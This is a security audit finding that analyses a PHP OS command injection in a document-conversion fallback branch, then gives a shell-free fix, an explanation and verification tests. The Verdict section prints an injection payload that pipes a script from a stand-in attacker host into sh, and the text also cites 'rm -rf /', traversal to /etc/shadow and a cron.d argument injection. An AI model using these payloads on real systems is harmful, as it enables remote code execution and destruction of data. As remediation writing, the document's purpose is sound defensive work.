# CWE-78 (OS Command Injection) - LegacyConvertFallback.php

## Verdict

Confirmed exploitable. `LegacyConvertFallback.php:19` builds a shell command by concatenating
`$requestedName` - which arrives unfiltered from `$_POST['document']` at line 24 - into the string
passed to `exec()`. PHP's `exec()` always runs its argument through `/bin/sh`, so any shell
metacharacter in the POST body is interpreted rather than treated as a filename.

A request with `document=x; curl http://attacker/s.sh | sh;` runs the primary `soffice` command
against a non-existent source file, gets a non-zero status, falls through to line 19, and executes
the attacker's command as the web server user. The `;`, `|`, `&&`, `` ` ``, and `$(...)` forms all
work; no quoting exists on this path to break out of first.

Two details make this worth calling out beyond the single reported line:

- **The fallback path is the only unprotected one.** Line 10 correctly wraps `$source` in
  `escapeshellarg()`, and lines 5-6 normalise the name with `basename()`. The legacy branch reuses
  neither. This is the common shape of the bug: the maintained code path was hardened and the
  rarely-taken error path was missed, so it also escapes notice in testing because it only runs
  when the primary converter fails.
- **The fallback also reintroduces path traversal.** It passes the raw `$requestedName`, not the
  `basename()`-normalised `$source`, so `../../etc/shadow` reaches `legacy-convert` as a path even
  without any shell metacharacter.

## Source

```text
$_POST['document']            (line 24, attacker-controlled request body)
  -> convert_document($requestedName)
     -> string concatenation into the command text   (line 19)
        -> exec()                                    (line 19, sink - spawns /bin/sh)
```

`$target` is also concatenated at line 19. It is derived through `basename()`, which strips
directory separators but not `;`, `|`, `&`, `$`, backticks, newlines, or spaces - so it is a second
live injection point on the same line, not a safe value.

## Fix

Stop invoking a shell. PHP 7.4 and later accept an array as the first argument to `proc_open()`;
in that form PHP execs the binary directly and hands each array element to the child as one
`argv` entry, so there is no shell to parse metacharacters and no escaping to get right.

Validate the filename against an allowlist before it reaches either the filesystem or a child
process, and use the same normalised value on both converter paths.

```php
<?php

/**
 * Runs a command without a shell. The array form of proc_open() (PHP 7.4+) execs the
 * binary directly, so each element is passed to the child as a single argv entry and
 * shell metacharacters carry no meaning.
 */
function run_converter(array $argv): bool
{
    $descriptors = [
        0 => ['file', '/dev/null', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w'],
    ];

    $process = proc_open($argv, $descriptors, $pipes);
    if (!is_resource($process)) {
        return false;
    }

    // Drain both pipes before proc_close() so the child cannot block on a full buffer.
    stream_get_contents($pipes[1]);
    stream_get_contents($pipes[2]);
    fclose($pipes[1]);
    fclose($pipes[2]);

    return proc_close($process) === 0;
}

function convert_document(string $requestedName): string
{
    $name = basename($requestedName);

    // Allowlist: a plain document filename. Requiring an alphanumeric first character
    // also rejects "..", dotfiles, and names starting with "-" that a converter would
    // otherwise parse as a command-line option.
    if (!preg_match('/^[A-Za-z0-9][A-Za-z0-9._-]{0,254}$/', $name)) {
        return '';
    }

    $source = '/srv/uploads/' . $name;
    $target = '/srv/converted/' . $name . '.pdf';

    if (run_converter([
        '/usr/bin/soffice', '--convert-to', 'pdf', $source, '--outdir', '/srv/converted',
    ])) {
        return $target;
    }

    if (run_converter(['/usr/bin/legacy-convert', $source, $target])) {
        return $target;
    }

    return '';
}

$document = $_POST['document'] ?? '';
$path = convert_document(is_string($document) ? $document : '');
```

### If you are pinned below PHP 7.4

The array form of `proc_open()` is unavailable, so the shell cannot be avoided with the built-in
process functions. Escape every interpolated value individually and keep the validation above:

```php
exec(sprintf(
    '/usr/bin/legacy-convert %s %s',
    escapeshellarg($source),
    escapeshellarg($target)
), $fallbackOutput, $fallbackStatus);
```

Each argument gets its own `escapeshellarg()` call. Wrapping a whole assembled command in one
call, or using `escapeshellcmd()` instead, does not work: `escapeshellcmd()` escapes metacharacters
but leaves quoting unbalanced and permits argument injection, which is why it is not a substitute
here. Treat this as the fallback, not the target state - `escapeshellarg()` on Windows has known
gaps around embedded double quotes and percent signs, and the array form has none of them.

## Explanation

**Why the shell is the problem.** `exec()`, `shell_exec()`, `system()`, `passthru()`, the backtick
operator, and the string form of `proc_open()` and `popen()` all pass their argument to `/bin/sh
-c`. The shell then splits, expands, and re-parses that string, at which point `;`, `|`, `&`,
`$()`, backticks, and newlines are control syntax. Concatenating a request value into that string
lets the request contribute syntax, not just data. The array form of `proc_open()` skips the shell
entirely, so the parsing step that creates the vulnerability never happens - a filename containing
`; rm -rf /` is delivered to the converter as one literal argument and simply fails to open.

**Why "escape it" is the second choice.** `escapeshellarg()` is correct when applied to each
argument separately, and the primary path at line 10 already does it correctly. But it is a
per-call obligation that has to be re-satisfied at every future call site, and this file is the
evidence of how that fails: one branch got it, the other did not. Choosing an API that has no
shell removes the obligation instead of restating it.

**Why the allowlist is still needed.** Removing the shell closes command injection but not
argument injection or traversal. A value like `--output=/etc/cron.d/pwn` is a single well-formed
argv entry that the shell never sees, yet `legacy-convert` may still read it as an option. The
regex requiring an alphanumeric first character blocks that class, and `basename()` plus the
restricted character set keeps the path inside `/srv/uploads`. Defence in depth here means both:
no shell for injection, allowlist validation for what the program itself will accept.

**Why the fallback reached production unprotected.** Line 19 only executes when `soffice` exits
non-zero. Functional tests exercise the success path and never reach it; the hardening applied to
line 10 was never mirrored. When remediating this class, audit sibling error, retry, and legacy
branches in the same function rather than the reported line alone.

### Verification

- `document=a.docx` still converts and returns `/srv/converted/a.docx.pdf`.
- `document=a.docx; id` is rejected by the allowlist and returns `''`; with the regex removed it
  reaches the converter as one literal argument and fails to open rather than running `id`.
- `document=../../etc/passwd` is reduced to `passwd` by `basename()` and looked up under
  `/srv/uploads`.
- `document=-h` and `document=--outdir=/tmp` are rejected before reaching either converter.
- Force the primary converter to fail (rename or chmod the `soffice` binary in a test environment)
  so the fallback branch actually runs, and confirm the same results there. Without this the fixed
  line is never executed.
- Grep the wider codebase for the same shape: `grep -rnE
  '\b(exec|shell_exec|system|passthru|popen|proc_open)\s*\(' --include='*.php'`, then check each
  hit for a variable concatenated into the command string.
